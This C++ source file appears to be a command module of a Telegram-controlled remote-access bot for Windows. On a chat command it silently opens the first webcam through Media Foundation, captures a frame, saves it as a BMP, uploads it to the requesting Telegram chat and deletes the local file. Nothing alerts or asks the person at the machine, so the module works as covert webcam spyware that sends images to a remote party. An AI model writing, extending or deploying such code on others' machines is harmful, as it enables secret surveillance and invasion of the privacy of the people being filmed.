#include <Commands/CameraCommand.h>

#include <Windows.h>
#include <mfapi.h>
#include <mfplay.h>
#include <mfreadwrite.h>
#include <shlwapi.h>
#include <wrl/client.h>
#include <string>
#include <fstream>
#include <comdef.h>

namespace Commands {

    void CameraCommand::execute(const int64_t chat_id, const Telegram::Models::Message &msg) {
        HRESULT hr = MFStartup(MF_VERSION);
        if (FAILED(hr)) {
            api_.sendMessage(chat_id, "❌ Media Foundation startup failed");
            return;
        }

        IMFAttributes* attr = nullptr;
        hr = MFCreateAttributes(&attr, 1);
        if (FAILED(hr)) {
            api_.sendMessage(chat_id, "❌ Failed to create MF attributes");
            MFShutdown();
            return;
        }
        attr->SetGUID(MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE,
                      MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);

        IMFActivate** devices = nullptr;
        UINT32 count = 0;
        hr = MFEnumDeviceSources(attr, &devices, &count);
        if (FAILED(hr) || count == 0) {
            api_.sendMessage(chat_id, count == 0 ?
                "❌ No camera found (device list is empty)" :
                "❌ Failed to enumerate video devices");
            if (devices) CoTaskMemFree(devices);
            attr->Release();
            MFShutdown();
            return;
        }

        // Activate first device
        IMFMediaSource* media_source = nullptr;
        hr = devices[0]->ActivateObject(
            __uuidof(IMFMediaSource),
            reinterpret_cast<void**>(&media_source)
        );
        for (UINT32 i = 0; i < count; ++i) devices[i]->Release();
        CoTaskMemFree(devices);
        attr->Release();

        if (FAILED(hr)) {
            api_.sendMessage(chat_id, "❌ Failed to activate camera");
            MFShutdown();
            return;
        }

        IMFSourceReader* reader = nullptr;
        IMFAttributes* reader_attr = nullptr;
        hr = MFCreateAttributes(&reader_attr, 1);
        if (SUCCEEDED(hr)) {
            reader_attr->SetUINT32(MF_SOURCE_READER_ENABLE_ADVANCED_VIDEO_PROCESSING, TRUE);
            hr = MFCreateSourceReaderFromMediaSource(media_source, reader_attr, &reader);
            reader_attr->Release();
        }
        media_source->Release();
        if (FAILED(hr)) {
            api_.sendMessage(chat_id, "❌ Failed to create source reader with color conversion");
            MFShutdown();
            return;
        }
        // Select video stream
        reader->SetStreamSelection(static_cast<DWORD>(MF_SOURCE_READER_ALL_STREAMS), FALSE);
        reader->SetStreamSelection(static_cast<DWORD>(MF_SOURCE_READER_FIRST_VIDEO_STREAM), TRUE);

        // Set output format to RGB32
        IMFMediaType* out_type = nullptr;
        hr = MFCreateMediaType(&out_type);
        if (SUCCEEDED(hr)) {
            out_type->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Video);
            out_type->SetGUID(MF_MT_SUBTYPE, MFVideoFormat_RGB32);
            hr = reader->SetCurrentMediaType(
                static_cast<DWORD>(MF_SOURCE_READER_FIRST_VIDEO_STREAM),
                nullptr, out_type
            );
            out_type->Release();
        }
        if (FAILED(hr)) {
            api_.sendMessage(chat_id, "❌ Не удалось задать формат RGB32");
            reader->Release();
            MFShutdown();
            return;
        }

        // Determine frame size and stride
        IMFMediaType* actual_type = nullptr;
        UINT32 width = 640, height = 480;
        UINT32 stride = 0;
        if (SUCCEEDED(reader->GetCurrentMediaType(
                MF_SOURCE_READER_FIRST_VIDEO_STREAM, &actual_type))) {
            MFGetAttributeSize(actual_type, MF_MT_FRAME_SIZE, &width, &height);
            actual_type->GetUINT32(MF_MT_DEFAULT_STRIDE, &stride);
            actual_type->Release();
        }
        if (stride == 0) stride = width * 4; // fallback

        // Read one sample
        IMFSample* sample = nullptr;
        DWORD stream_index = 0, flags = 0;
        LONGLONG timestamp = 0;
        constexpr int max_attempts = 10;
        int attempts = 0;
        HRESULT read_hr = S_OK;
        while (attempts++ < max_attempts) {
            read_hr = reader->ReadSample(
                MF_SOURCE_READER_FIRST_VIDEO_STREAM,
                0, &stream_index, &flags, &timestamp, &sample
            );
            if (FAILED(read_hr) || sample) break;
        }
        if (FAILED(read_hr) || !sample) {
            api_.sendMessage(chat_id, "❌ Failed to read sample from camera");
            reader->Release();
            MFShutdown();
            return;
        }

        // Convert sample to contiguous buffer
        IMFMediaBuffer* buffer = nullptr;
        sample->ConvertToContiguousBuffer(&buffer);
        sample->Release();

        // Lock buffer and get data pointer
        BYTE* data = nullptr;
        DWORD max_len = 0, cur_len = 0;
        buffer->Lock(&data, &max_len, &cur_len);

        DWORD image_size = static_cast<DWORD>(abs(static_cast<LONG>(height))) * stride;
        BITMAPFILEHEADER bmf_header = {};
        BITMAPINFOHEADER bi = {};

        bmf_header.bfType      = 0x4D42; // 'BM'
        bmf_header.bfOffBits   = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
        bmf_header.bfSize      = bmf_header.bfOffBits + image_size;

        bi.biSize          = sizeof(BITMAPINFOHEADER);
        bi.biWidth         = static_cast<LONG>(width);
        bi.biHeight        = -static_cast<LONG>(height); // top-down bitmap
        bi.biPlanes        = 1;
        bi.biBitCount      = 32;
        bi.biCompression   = BI_RGB;
        bi.biSizeImage     = image_size;

        // Write BMP to file
        std::ofstream file("camera.bmp", std::ios::binary);
        file.write(reinterpret_cast<char*>(&bmf_header), sizeof(bmf_header));
        file.write(reinterpret_cast<char*>(&bi),         sizeof(bi));
        file.write(reinterpret_cast<char*>(data),        image_size);
        file.close();

        // Cleanup
        buffer->Unlock();
        buffer->Release();
        reader->Release();
        MFShutdown();

        api_.sendPhoto(chat_id, "camera.bmp", "📷 Camera snapshot");
        std::remove("camera.bmp");
    }

}
